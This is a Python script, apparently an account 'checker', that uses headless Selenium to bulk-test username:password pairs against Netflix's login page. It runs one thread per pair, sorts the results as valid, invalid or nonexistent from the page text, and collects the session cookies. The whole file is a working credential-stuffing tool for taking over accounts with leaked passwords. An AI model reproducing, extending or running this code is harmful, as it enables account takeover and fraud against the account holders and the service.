import os
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

from webdriver_manager.chrome import ChromeDriverManager

from threading import Thread


# soft by cazqev
class Account:
    def __init__(self, json: dict):
        self.username = json.get('username')
        self.password = json.get('password')
        self.json = json


class Response:
    def __init__(self, json: dict):
        self.account = Account(json.get('account'))
        self.status = json.get('status')
        self.cookies = json.get('cookies')
        self.json = json


class Settings:
    URL = 'https://www.netflix.com/il-en/login'
    XPATH_MAIL = '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div/div/label/input'
    XPATH_PASSWORD = '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input'
    BUTTON_XPATH = '/html/body/div[1]/div/div[3]/div/div/div[1]/form/button'
    USERNAME, PASSWORD = None, None
    RESULTS = []
    COMPLETED = False


class Checker:
    def __init__(self):
        options = Options()
        options.add_argument("--headless")

        self.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    def login_into_page(self):
        self.driver.get(Settings.URL)

    def try_login(self):
        self.driver.find_element(By.XPATH, Settings.XPATH_MAIL).send_keys(Settings.USERNAME)
        self.driver.find_element(By.XPATH, Settings.XPATH_PASSWORD).send_keys(Settings.PASSWORD)

    def set_login_and_password(self, login: str, password: str):
        Settings.USERNAME = login
        Settings.PASSWORD = password

    def get_status(self):
        self.driver.find_element(By.XPATH, Settings.BUTTON_XPATH).click()
        time.sleep(3)
        data = self.driver.page_source
        if """Sorry, we can't find an account with this email address""" in data:
            # print('Account ({0}:{1}) doesnt exists'.format(Settings.USERNAME, Settings.PASSWORD))
            Settings.RESULTS.append(Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Doesnt exists',
                'cookies': self.driver.get_cookies()
            }))
            # Settings.RESULTS.append('Account ({0}:{1}) doesnt exists'.format(Settings.USERNAME, Settings.PASSWORD))
            Settings.COMPLETED = True

            return Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Doesnt exists',
                'cookies': self.driver.get_cookies()
            })

        elif """Incorrect password""" in data:
            # print('Account ({0}:{1}) is invalid'.format(Settings.USERNAME, Settings.PASSWORD))
            Settings.RESULTS.append(Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Invalid',
                'cookies': self.driver.get_cookies()
            }))

            Settings.COMPLETED = True

            return Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Invalid',
                'cookies': self.driver.get_cookies()
            })

        if """Please enter a valid email.""" in data:
            # print('Account ({0}:{1}) doesnt exists'.format(Settings.USERNAME, Settings.PASSWORD))

            Settings.RESULTS.append(Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Doesnt exists',
                'cookies': self.driver.get_cookies()
            }))

            Settings.COMPLETED = True

            return Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Doesnt exists',
                'cookies': self.driver.get_cookies()
            })

        else:
            # print(data)
            # print('Account ({0}:{1}) is valid'.format(Settings.USERNAME, Settings.PASSWORD))
            Settings.RESULTS.append(Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Valid',
                'cookies': self.driver.get_cookies()
            }))
            Settings.COMPLETED = True

            # open(f'.\\cookies\\{Settings.USERNAME.replace("@", ".")}.json', 'w').write(str(self.driver.get_cookies()))
            return Response({
                'account': {
                    'username': Settings.USERNAME,
                    'password': Settings.PASSWORD
                },
                'status': 'Valid',
                'cookies': self.driver.get_cookies()
            })


def checker(username: str, password: str):
    ses = Checker()
    ses.set_login_and_password(username, password)
    ses.login_into_page()
    ses.try_login()
    ses.get_status()


def start(username=None, password=None, username_password=None, path=None):
    os.system('echo // PROJECT  STARTED //')
    os.system('echo // CREATED BY CAZQEV //')

    if username and password:
        Thread(target=checker, args=(username, password)).start()
    elif username_password:
        x = [None, None]
        if ':' in username_password:
            x = username_password.split(':')
        elif ';' in username_password:
            x = username_password.split(';')
        elif ',' in username_password:
            x = username_password.split(',')
        else:
            exit('wrong format')

        Thread(target=checker, args=(x[0], x[1])).start()
    elif path:
        x = open(path, 'r').readlines()
        for line in x:
            if ':' in line:
                line = line.split(':')
            elif ';' in line:
                line = line.split(';')
            elif ',' in line:
                line = line.split(',')
            Thread(target=checker, args=(line[0], line[1])).start()
